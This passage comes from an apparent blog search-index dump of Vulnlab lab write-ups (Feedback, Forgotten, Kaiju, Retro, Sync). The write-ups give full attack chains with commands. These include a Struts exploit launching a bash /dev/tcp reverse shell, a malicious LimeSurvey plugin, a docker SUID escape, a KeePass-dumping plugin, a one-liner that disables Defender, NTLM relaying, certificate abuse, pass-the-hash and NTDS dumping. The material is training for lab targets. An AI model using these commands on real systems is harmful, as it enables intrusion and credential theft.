that the website is actually vulnerable to CVE-2017-5638, which is related to Apache Struts, there is a PoC of that exploit in GitHub . We can setup a listener for the port 4444 and run the exploit:\nsyl@sylsec:~/vulnlab/Feedback/exploits/struts-pwn$ python3 struts-pwn.py --url \u0026#39;http://10.10.80.221:8080/feedback/logfeedback.action\u0026#39; -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.0.107/4444 0\u0026gt;\u0026amp;1\u0026#39; [*] URL: http://10.10.80.221:8080/feedback/logfeedback.action [*] CMD: bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.0.107/4444 0\u0026gt;\u0026amp;1 That would give us the initial shell.\nPrivilege Escalation We can start enumerating the system from our reverse shell with linpeas, and we would also need to spawn a stable tty shell, I used python for that matter.\ntomcat@ip-10-10-10-7:/tmp$ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Upon carefully reviewing the output from linpeas, we would find the configuration for Apache Tomcat containing clear-text credentials.\n/opt/tomcat/conf/tomcat-users.xml \u0026lt;user username=\u0026#34;admin\u0026#34; password=\u0026#34;H2R\u0026lt;REDACTED\u0026gt;\u0026#34; roles=\u0026#34;manager-gui\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;robot\u0026#34; password=\u0026#34;H2R\u0026lt;REDACTED\u0026gt;\u0026#34; roles=\u0026#34;manager-script\u0026#34;/\u0026gt; We can try to switch to the user ubuntu which doesn\u0026rsquo;t work, but the user root does.\ntomcat@ip-10-10-10-7:/tmp$ su ubuntu su ubuntu Password: H2R\u0026lt;REDACTED\u0026gt; su: Authentication failure tomcat@ip-10-10-10-7:/tmp$ su root su root Password: H2R\u0026lt;REDACTED\u0026gt; root@ip-10-10-10-7:/# whoami whoami root root@ip-10-10-10-7:/# cat /root/root.txt cat /root/root.txt VL{\u0026lt;REDACTED\u0026gt;} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-26-vulnlab-feedback\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-26-vulnlab-forgotten\/": {
        "title": "Vulnlab - Forgotten [Easy]",
        "tags": [],
        "content": " Name OS Difficulty Forgotten Linux Easy Summary We would find a website that we are going to fuzz and find an installation page for the LimeSurvey software. Then we would set up our local database to work with the installation of that software and run it on the server. We would then install a malicious plugin so that we can gain remote code execution on the machine. Then we would find credentials in the environment variables that we can use to gain access to the SSH. After that, we are going to abuse the mount points of the docker image to gain root on the host machine.\nInitial Foothold Upon scanning the machine, we would find a couple of ports open ports.\n$ sudo nmap -sS -sU 10.10.105.241 --min-rate 10000 --open -p- Going to the web page, we would find that it results to status code 403, so the next step that we are going to take is to fuzz it\n$ ffuf -w $commontxt -u http://10.10.105.241/FUZZ Then we would find an installation page for the software LimeSurvey.\nWe are going to try to install it, however to do that we need to install mysql server onto our local server and expose it to the machine so that the system can connect to us, otherwise we would get:\nERROR 1130 (HY000): Host \u0026#39;\u0026lt;MACHINE_IP\u0026gt;\u0026#39; is not allowed to connect to this MySQL server In order to do that, we would need to set our MySQL server to accept connections from anywhere and create a user.\nFirst, we need to edit our configuration\n$ sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf # Change \u0026#34;bind-address\u0026#34; to \u0026#34;0.0.0.0\u0026#34; Then we can connect using the root user and\nmysql\u0026gt; CREATE USER \u0026#39;forgotten\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;forgotten\u0026#39;; mysql\u0026gt; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;forgotten\u0026#39;@\u0026#39;%\u0026#39; WITH GRANT OPTION; mysql\u0026gt; FLUSH PRIVILEGES; We would then be able to install the LimeSurvey and get into the admin panel.\nWe can now research of some ways to get remote code execution on the machine using this software, a quick google search would lead us to this exploit: LimeSurvey RCE .\nThe exploit is leveraging the plugins feature of the software to install a malicious plugin which can connect to our listener.\nWe can setup such plugin by cloning the repository and replacing the needed variables in the file php-rev.php after that we also need to edit the config.xml and add the installed version of the LimeSurvey to the \u0026lt;compatibility\u0026gt; element, after that we would zip the files and upload them.\n$ zip plg.zip ./php-rev.php ./config.xml We can then navigate to /index.php/admin/pluginmanager?sa=upload to upload our plugin. After we upload it and activate it, we can start a local listener with the given configuration earlier, and to execute our reverse shell we need to head to /survey/upload/plugins/Y1LD1R1M/php-rev.php\nWe can now run linpeas to enumerate further, and upon examining the output we would find this environment variable set in the beginning LIMESURVEY_PASS=5W5\u0026lt;REDACTED\u0026gt; we would also find that the current shell is running within a docker container.\nAfter finding that password I immediately tried it to change the user to root in the current container which worked, and I also tried to SSH with the user limesvc which also worked!\nAnd judging by the system information, it seems that we are not in the docker container anymore, if we list the home directory we would find the user.txt flag.\nPrivilege Escalation We can use a tool called CDK - Zero Dependency Container Penetration Toolkit to inspect our docker container which runs the LimeSurvey application.\nIn the Mounts section we can see the listed mounts, the resolv.conf | hostname | hosts are standard for every container but the /opt/limesurvey isn\u0026rsquo;t so we can check that out.\nWe can see that the host has mounted the /opt/limesurvey directory in the /dev/ folder on the container, We can go to /dev/ to create a single file and check its permissions on the host system. Since that the docker container process is running as root we would have the same permissions from within the container. The file that has been created is having root permissions.\nWe can now try the same thing but with the bash executable, we would try the following thing on the container:\nroot@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./syl root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./syl Now on the host machine we can invoke our binary ./syl and we should be root.\nlimesvc@ip-xxx:/opt/limesurvey$ ./syl -p syl-5.1# whoami root syl-5.1# cat /root/root.txt VL{\u0026lt;REDACTED\u0026gt;} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-26-vulnlab-forgotten\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-02-19-vulnlab-kaiju\/": {
        "title": "Vulnlab - Kaiju Chain [Hard]",
        "tags": [],
        "content": " Through the writeup the IPs may change, this is due that I did the machine in a few tries so I turned off the instances.\nWe start with 3 targets in my case the targets were:\n10.10.247.37\r10.10.247.38\r10.10.247.39 Scanning them:\n$ rustscan -a $(sed --z \u0026#39;s/\\n/,/g\u0026#39; target.txt)\rOpen 10.10.247.38:21\rOpen 10.10.247.38:22\rOpen 10.10.247.38:3389\rOpen 10.10.247.39:3389\rOpen 10.10.247.37:3389 We are able to log in with ftp:ftp, then we can list the files:\ndr-xr-xr-x 1 ftp ftp 0 Dec 27 10:15 Configs\rdr-xr-xr-x 1 ftp ftp 0 Dec 17 14:44 Licenses\rdr-xr-xr-x 1 ftp ftp 0 Dec 27 10:15 Passwords\rdr-xr-xr-x 1 ftp ftp 0 Dec 29 08:56 Software\rdr-xr-xr-x 1 ftp ftp 0 Dec 27 10:15 Temp We can download them all using wget\nwget -m ftp://ftp:ftp@10.10.247.38 We find interesting files that contains credentials under the Passwords folder.\n-r--r--r-- 1 ftp ftp 20 Jan 30 20:10 firewalls.txt\r-r--r--r-- 1 ftp ftp 9 Jan 30 20:16 ftp.txt\r-r--r--r-- 1 ftp ftp 32 Dec 29 08:53 local.txt firewall:firexx\rftp:ftp\radministrator:[Moved to KeePass] Under the Configs folder we can find users.xml\n-r--r--r-- 1 ftp ftp 2236 Dec 17 14:54 users.xml Upon opening it we can see another user called backup and its hashed password.\n\u0026lt;user name=\u0026#34;backup\u0026#34; enabled=\u0026#34;true\u0026#34;\u0026gt; ... \u0026lt;password index=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;hash\u0026gt;ZqRNhkBO8d4VYJb0YmF7cJgjECAH4...\u0026lt;/hash\u0026gt; \u0026lt;salt\u0026gt;aec9Yt49edyEvXkZUinmS52UrwNo...\u0026lt;/salt\u0026gt; \u0026lt;iterations\u0026gt;100000\u0026lt;/iterations\u0026gt; \u0026lt;/password\u0026gt; ... We can check the FileZilla\u0026rsquo;s forums to see what type of hash it is, specifically I used these:\nhttps://forum.filezilla-project.org/viewtopic.php?t=55179 https://forum.filezilla-project.org/viewtopic.php?t=54821 https://john-users.openwall.narkive.com/giDMyLS3/using-pbkdf2-hmac-sha256 We should replace the + with . in our hash before trying to crack it, the format should be this: $pbkdf2-sha256$iterations$salt$hash\nSince the hash doesn\u0026rsquo;t crack with rockyou we should try to pass some simple rules such as:\n$1$2$3 which is derived from the credentials that we gathered, specifically firewalls.txt\n$ hashcat -m 20300 ./filezilla.hash /opt/rockyou.txt -r ./hash_rule.txt This cracks to ....123, then we can use this password to log in with ssh into the server:\nMicrosoft Windows [Version 10.0.20348.2159]\r(c) Microsoft Corporation. All rights reserved.\rbackup@BERSRV200 C:\\Users\\backup\u0026gt; Listing the C:\\Users we can see another users: clare.frost and sasrv200, we should keep note of them. Using the users.xml we can see that there is an E:\\ drive, we can explore that further.\nWe can see some interesting files there such as:\nit.kdbx\rfilezilla-server.log\rinstall.log We can discover the administrator\u0026rsquo;s hash there:\n[--admin.password@index=1 --admin.password.hash=mSbrgj1R6oqMMSk4Qk1TuYTc... --admin.password.salt=AdRNx7rAs1CEM23pA.... --admin.password.iterations=100000] And then again we can create custom wordlist to crack it\n$ hashcat -m 20300 ./filezilla.hash /opt/rockyou.txt -r ./hash_rule.txt The next part of this chain is to enumerate the ports in the machine, we can see some interesting ports such as:\nTCP [::1]:14148 [::]:0 LISTENING 3192 We can forward this port, but if we google around we can see that it is related to FileZilla Server, lets forward it:\nssh -L 127.0.0.1:8003:127.0.0.1:14148 backup@10.10.247.38 Now comes the tricky part, you have to use Windows to make this client work, I\u0026rsquo;ve faced some issues on Linux but I know that some people have made it work. You also need to use the same version of this software, luckily under Software folder there is a FileZilla_Server_1.8.0_win64-setup.exe which we can use to start the UI (we do not need the server), then we can configure it to connect to the port that we forwarded.\nWe can then enumerate the current users, but most importantly we can add our new user syl:5yl\nThen we should be able to access the ftp server using the newly created user. Upon listing the FTP, we would notice that we have access to the account sasrv200 because we can list files there. Since that we have READ \u0026amp; WRITE access we can put authorized_keys in a .ssh folder with our public key.\nftp\u0026gt; mkdir .ssh\r257 \u0026#34;/Users/sasrv200/.ssh\u0026#34; created successfully.\r...\rftp\u0026gt; put authorized_keys\rlocal: authorized_keys remote: authorized_keys\r229 Entering Extended Passive Mode (|||65019|)\r150 Starting data transfer.\r100% |******************************************************************************************************************************| 107 155.72 KiB/s 00:00 ETA\r226 Operation successful\r107 bytes sent in 00:00 (2.51 KiB/s)\rftp\u0026gt; dir\r229 Entering Extended Passive Mode (|||65164|)\r150 Starting data transfer.\r-rw-rw-rw- 1 ftp ftp 107 Feb 18 18:57 authorized_keys\r226 Operation successful Now we should be able to login as that user using ssh.\nMicrosoft Windows [Version 10.0.20348.2159]\r(c) Microsoft Corporation. All rights reserved.\rkaiju\\sasrv200@BERSRV200 C:\\Users\\sasrv200\u0026gt;tree /f /a\rFolder PATH listing\rVolume serial number is AC3F-A083\rC:.\r+---.ssh\r| authorized_keys\r|\r+---Desktop\r| flag.txt After some further enumeration over the account we can notice that there is a process called KeePass that pops out every now and then.\nI created this little script to watch for changes\nwhile ($true) { Clear-Host $processes = Get-Process | Sort-Object CPU -Descending | Select-Object -Property ID, ProcessName, CPU $currentTime = Get-Date Write-Host \u0026#34;Process Watcher - Current Time: $currentTime\u0026#34; $processes Start-Sleep -Seconds 5 } After that, we can see that in the E:\\ drive under the KeePass folder there are Plugins folder which is empty. This hints for this malicious plugin:\nhttps://github.com/d3lb3/KeeFarceReborn When you put your malicious plugin under the Plugins folder you should expect a dump of the database in C:\\temp there will be a *.xml file. Eventually you will find the administrator\u0026rsquo;s password there N......Mel...\nThen we can login with SSH.\nMicrosoft Windows [Version 10.0.20348.2159]\r(c) Microsoft Corporation. All rights reserved.\radministrator@BERSRV200 C:\\Users\\Administrator\u0026gt; Let\u0026rsquo;s disable the AV and the Firewall\ncmd.exe /c \u0026#34;powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend \u0026amp;\u0026amp; powershell Set-MpPreference -SubmitSamplesConsent 2 \u0026amp; \u0026#34;%ProgramFiles%\\Windows Defender\\MpCmdRun.exe\u0026#34; -RemoveDefinitions -All\u0026#34; Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False Now, lets copy chisel with scp and start it, then we can adjust our proxychains tool and setup a proxy to access the internal ports.\nUpon the enumeration using the ADCS module from nxc, we can see that there is an enrollment server:\nWe would want to see the vulnerable certificates now using certipy\n$ proxychains certipy find -username clare.frost@kaiju.vl -hashes be167.. -vulnerable -stdout -dc-ip 10.10.213.165 There is ESC8 vulnerability which we can exploit.\nThe next step is quite tricky, we need to redirect the traffic that comes to the machine that we are in BERSRV200 to other port that we then should forward to our machine where we setup a relay towards the BERSRV100 so that we can get the authenticating certificate that we use from BERSRV105 towards BERSRV100, with that certificate we can then try to get TGT from the BERSRV100 principal which in turn will retrieve us the NT hash.\nTo setup this we would need to do these following steps:\nOn the BERSRV200 machine use the https://github.com/jellever/StreamDivert to forward the traffic from 445 to 8445 Forward the 8445 port on the BERSRV200 machine towards your local machine Setup a ntlmrelayx with the following args: proxychains ntlmrelayx -t http://BERSRV100.kaiju.vl/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController' Transform the certificate from b64 to pfx (simply decode it and save it to pfx) Use proxychains certipy auth -pfx cert.pfx to ask for TGT, to retrieve the NT hash Then we should be able to dump the OS credentials with the retrieved hash for the user BERSRV100$\n$ proxychains crackmapexec smb 10.10.213.165 -u \u0026#39;BERSRV100$\u0026#39; -H \u0026#39;19ad5c18445fxxxxx\u0026#39; --ntds drsuapi And then we can use the administrator\u0026rsquo;s hash to log in using winrm or similar.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2024-02-19-vulnlab-kaiju\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-19-vulnlab-retro\/": {
        "title": "Vulnlab - Retro [Easy]",
        "tags": [],
        "content": "Retro is an easy windows (active directory) machine by Vulnlab.\nI\u0026rsquo;ve tried to show as many methods as possible to retrieve the same thing, for example retrieving the administrator\u0026rsquo;s NTLM hash and changing the password for a user with 2 different methods, I hope that you can learn more that way which is the whole point of this write-up!\nEnumeration Started with a simple nmap scan:\nsyl@sylsec:~/vulnlab/Retro$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN ^Cap.txt -sC -sV 10.10.64.243 -Pn --min-rate 10000 ... 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=12/19%Time=6581A887%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows ... Next I\u0026rsquo;ve used enum4linux which showed me the FQDN, Domain and not much else.\nsyl@sylsec:~/vulnlab/Retro$ enum4linux 10.10.64.243 NetBIOS computer name: DC NetBIOS domain name: RETRO DNS domain: retro.vl FQDN: DC.retro.vl Derived membership: domain member Derived domain: RETRO Then I went on to enumerate the SMB protocol.\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u \u0026#39;Guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [+] retro.vl\\Guest: SMB 10.10.64.243 445 DC [*] Enumerated shares SMB 10.10.64.243 445 DC Share Permissions Remark SMB 10.10.64.243 445 DC ----- ----------- ------ SMB 10.10.64.243 445 DC ADMIN$ Remote Admin SMB 10.10.64.243 445 DC C$ Default share SMB 10.10.64.243 445 DC IPC$ READ Remote IPC SMB 10.10.64.243 445 DC NETLOGON Logon server share SMB 10.10.64.243 445 DC Notes SMB 10.10.64.243 445 DC SYSVOL Logon server share SMB 10.10.64.243 445 DC Trainees READ I went in and checked the readable share \u0026ldquo;Trainees\u0026rdquo; and I got the file Important.txt which contained the following text:\nDear Trainees, I know that some of you seemed to struggle with remembering strong and unique passwords. So we decided to bundle every one of you up into one account. Stop bothering us. Please. We have other stuff to do than resetting your password every day. Regards The Admins That is definitely interesting it does hint that there may be weak credentials, so let\u0026rsquo;s try to enumerate some users. Since that the account \u0026ldquo;Guest\u0026rdquo; is working, I used the lookupsid by the impacket\u0026rsquo;s scripts.\nsyl@sylsec:~/tools/impacket/examples$ python3 lookupsid.py Guest@10.10.64.243 Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra Password: [*] Brute forcing SIDs at 10.10.64.243 [*] StringBinding ncacn_np:10.10.64.243[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172 498: RETRO\\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: RETRO\\Administrator (SidTypeUser) 501: RETRO\\Guest (SidTypeUser) 502: RETRO\\krbtgt (SidTypeUser) 512: RETRO\\Domain Admins (SidTypeGroup) 513: RETRO\\Domain Users (SidTypeGroup) 514: RETRO\\Domain Guests (SidTypeGroup) 515: RETRO\\Domain Computers (SidTypeGroup) 516: RETRO\\Domain Controllers (SidTypeGroup) 517: RETRO\\Cert Publishers (SidTypeAlias) 518: RETRO\\Schema Admins (SidTypeGroup) 519: RETRO\\Enterprise Admins (SidTypeGroup) 520: RETRO\\Group Policy Creator Owners (SidTypeGroup) 521: RETRO\\Read-only Domain Controllers (SidTypeGroup) 522: RETRO\\Cloneable Domain Controllers (SidTypeGroup) 525: RETRO\\Protected Users (SidTypeGroup) 526: RETRO\\Key Admins (SidTypeGroup) 527: RETRO\\Enterprise Key Admins (SidTypeGroup) 553: RETRO\\RAS and IAS Servers (SidTypeAlias) 571: RETRO\\Allowed RODC Password Replication Group (SidTypeAlias) 572: RETRO\\Denied RODC Password Replication Group (SidTypeAlias) 1000: RETRO\\DC$ (SidTypeUser) 1101: RETRO\\DnsAdmins (SidTypeAlias) 1102: RETRO\\DnsUpdateProxy (SidTypeGroup) 1104: RETRO\\trainee (SidTypeUser) 1106: RETRO\\BANKING$ (SidTypeUser) 1107: RETRO\\jburley (SidTypeUser) 1108: RETRO\\HelpDesk (SidTypeGroup) 1109: RETRO\\tblack (SidTypeUser) We got a couple of users:\n1000: RETRO\\DC$ (SidTypeUser) 1104: RETRO\\trainee (SidTypeUser) 1106: RETRO\\BANKING$ (SidTypeUser) 1107: RETRO\\jburley (SidTypeUser) 1109: RETRO\\tblack (SidTypeUser) I\u0026rsquo;ve stripped the users and added them to users.txt with the addition of \u0026lsquo;administrator\u0026rsquo;. Since I knew that there would be weak credentials, I tried with the following pattern user:pass.\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u ./users.txt -p ./users.txt SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [+] retro.vl\\trainee:trainee And I\u0026rsquo;ve got a hit for the user trainee. Now let\u0026rsquo;s try to get the SMB shares once again with that user.\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u trainee -p trainee --shares SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [+] retro.vl\\trainee:trainee SMB 10.10.64.243 445 DC [*] Enumerated shares SMB 10.10.64.243 445 DC Share Permissions Remark SMB 10.10.64.243 445 DC ----- ----------- ------ SMB 10.10.64.243 445 DC ADMIN$ Remote Admin SMB 10.10.64.243 445 DC C$ Default share SMB 10.10.64.243 445 DC IPC$ READ Remote IPC SMB 10.10.64.243 445 DC NETLOGON READ Logon server share SMB 10.10.64.243 445 DC Notes READ SMB 10.10.64.243 445 DC SYSVOL READ Logon server share SMB 10.10.64.243 445 DC Trainees READ syl@sylsec:~/vulnlab/Retro$ smbclient //retro.vl/Notes -U \u0026#39;trainee\u0026#39; Password for [WORKGROUP\\trainee]: trainee Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Jul 24 01:03:16 2023 .. DHS 0 Wed Jul 26 12:54:14 2023 ToDo.txt A 248 Mon Jul 24 01:05:56 2023 6261499 blocks of size 4096. 2179053 blocks available smb: \\\u0026gt; get Todo.txt getting file \\Todo.txt of size 248 as Todo.txt (1,5 KiloBytes/sec) (average 1,5 KiloBytes/sec) I got a file Todo.txt lets take a look:\nThomas, after convincing the finance department to get rid of their ancienct banking software it is finally time to clean up the mess they made. We should start with the pre created computer account. That one is older than me. Best James This text file hints that there is some ancient banking software and some pre-created computer account, judging by that I can safely assume that they are talking about the account BANKING$, I tried onec again some weak credentials like $BANKING:banking and I got this result:\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u BANKING$ -p \u0026#39;banking\u0026#39; SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [-] retro.vl\\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT The result I got is STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT which means that the password is correct! (REF: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts ) But I cannot use this account until the password is changed, so lets do that. There is changepasswd.py by Impacket (https://github.com/fortra/impacket/blob/master/examples/changepasswd.py ) which I can use to change the password via RPC, the thing that I need is another user, which I already have (trainee). There are other methods to change the password like kpasswd as well.\nChange the password via RPC (imapcket\u0026rsquo;s changepasswd.py) Method #1 (impacket-env) syl@sylsec:~/tools/impacket/examples$ python changepasswd.py retro.vl/\u0026#39;BANKING$\u0026#39;:\u0026#39;banking\u0026#39;@10.10.64.243 -altuser trainee -altpass trainee Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra New password: Retype new password: Summer2018! [!] Attempting to *change* the password of retro.vl/BANKING$ as retro.vl/trainee. You may want to use \u0026#39;-reset\u0026#39; to *reset* the password of the target. [*] Changing the password of retro.vl\\BANKING$ [*] Connecting to DCE/RPC as retro.vl\\trainee [*] Password was changed successfully. Using kpasswd Method #2 I can go with the LDAP way of chaning the password using the binary kpasswd and since this is uncommon on Linux you can install it with:\nsyl@sylsec:~/tools/$ sudo apt install krb5-user Then you have to edit the realms in the /etc/krb5.conf\n[libdefaults] default_realm = RETRO.VL dns_lookup_realm = false ticket_lifetime = 24h renew_lifetime = 7d rdns = false kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true [realms] RETRO.VL = { kdc = DC.RETRO.VL admin_server = DC.RETRO.VL } [domain_realm] .retro.vl = RETRO.VL And then simply invoke kpasswd\nsyl@sylsec:~/vulnlab/Retro$ sudo kpasswd BANKING$ Password for BANKING$@RETRO.VL: Enter new password: Enter it again: Password changed. And now we can use this account!\nLets enumerate the ADCS (Active Directory Certificate Services). I used certipy for that matter.\nsyl@sylsec:~/vulnlab/Retro$ certipy find -u trainee -p \u0026#39;trainee\u0026#39; -dc-ip 10.10.113.62 -vulnerable Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;retro-DC-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;retro-DC-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;retro-DC-CA\u0026#39; via RRP [*] Got CA configuration for \u0026#39;retro-DC-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20231219202428_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20231219202428_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20231219202428_Certipy.json\u0026#39; Looking at the 20231219202428_Certipy.txt we can see a ESC1 vunlerability related to the RetroClients certificate.\nMore about ESC1\nLooking at the permissions of the certificate template we notice that it can be used only by:\nRETRO.VL\\Domain Admins RETRO.VL\\Enterprise Admins RETRO.VL\\Domain Computers I believe that the user BANKING$ is within those groups so lets see:\nsyl@sylsec:~/vulnlab/Retro$ bloodhoundpy -dc retro.vl -u trainee -p trainee -d retro.vl WARNING: Could not find a global catalog server, assuming the primary DC has this role If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc INFO: Getting TGT for user INFO: Connecting to LDAP server: retro.vl INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 2 computers INFO: Found 7 users INFO: Connecting to LDAP server: retro.vl INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 53 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: INFO: Querying computer: DC.retro.vl INFO: Done in 00M 04S Then I can query the user BANKING$ and I can see its First Degree Group Membership that this user is part of the group DOMAIN COMPUTERS, so we can use that user to exploit the certificate and retrieve the NTLM hash of the administrator.\nLets retrieve the private key:\nsyl@sylsec:~/vulnlab/Retro$ certipy req -u \u0026#39;BANKING$\u0026#39; -p \u0026#39;Summer2018!\u0026#39; -dc-ip \u0026#39;10.10.64.243\u0026#39; -target \u0026#39;dc.retro.vl\u0026#39; -ca \u0026#39;retro-DC-CA\u0026#39; -template \u0026#39;RetroClients\u0026#39; -upn \u0026#39;administrator\u0026#39; -key-size 4096 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 13 [*] Got certificate with UPN \u0026#39;administrator\u0026#39; [*] Certificate has no object SID [*] Saved certificate and private key to \u0026#39;administrator.pfx\u0026#39; UnPAC the hash Method #1 We can use the technique UnPAC the hash to get the NTLM hash using the PKINITtools.\nFirst we need to retrieve the TGT and the AS-REP encryption key.\nsyl@sylsec:~/vulnlab/Retro/temp$ gettgtpkinit -cert-pfx ../exfiltrated/administrator.pfx -dc-ip 10.10.113.62 retro.vl/administrator ../exfiltrated/administrator.ccache 2023-12-19 20:53:00,328 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2023-12-19 20:53:00,802 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2023-12-19 20:53:00,889 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2023-12-19 20:53:00,889 minikerberos INFO 23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec INFO:minikerberos:23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec 2023-12-19 20:53:00,895 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file Then we can use the getnthash.py to retrieve the NTLM hash.\nsyl@sylsec:~/vulnlab/Retro/exfiltrated$ getnthash retro.vl/administrator -key 23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec Impacket v0.11.0 - Copyright 2023 Fortra [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash 25....\u0026lt;hash\u0026gt; Using Certipy Method #2 syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip \u0026#39;10.10.64.243\u0026#39; -username \u0026#39;administrator\u0026#39; -domain retro.vl Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@retro.vl [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@retro.vl\u0026#39;: aad3b435b51404eeaad3b435b51404ee:25\u0026lt;hash\u0026gt; Then we can use that that hash for PTH (Pass the hash) attack.\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u administrator -H 25\u0026lt;hash\u0026gt; -x \u0026#34;cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34; SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [+] retro.vl\\administrator:25\u0026lt;hash\u0026gt; (Pwn3d!) SMB 10.10.64.243 445 DC [+] Executed command via wmiexec SMB 10.10.64.243 445 DC VL{\u0026lt;hash\u0026gt;} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-19-vulnlab-retro\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-24-vulnlab-sync\/": {
        "title": "Vulnlab - Sync [Easy]",
        "tags": [],
        "content": " Name OS Difficulty Sync Linux (Ubuntu) Easy Summary We would find a TCP port 873 open that is related to the rsync utility, which we can connect to. Upon connecting, we would find folders related to the http server that is running. After the exfiltration of those files, we would find a SQLite3 database which contains several hashes of some users. The hashes are constructed a bit odd so we would create a simple utility in Go to help us bruteforce the hash, then we would use the FTP with the found credentials to put our public SSH key so that we can log in with SSH. Then we would find a folder related to some backups of the machine, we will exfiltrate those files, and we are going to try to crack the newly found credentials. Then we would be able to switch users again, and we are going to enumerate once more to find a running CRON job that we would use to gain the root access of the machine.\nExploitation / Initial Foothold We would start with a nmap scan that would scan TCP and UDP 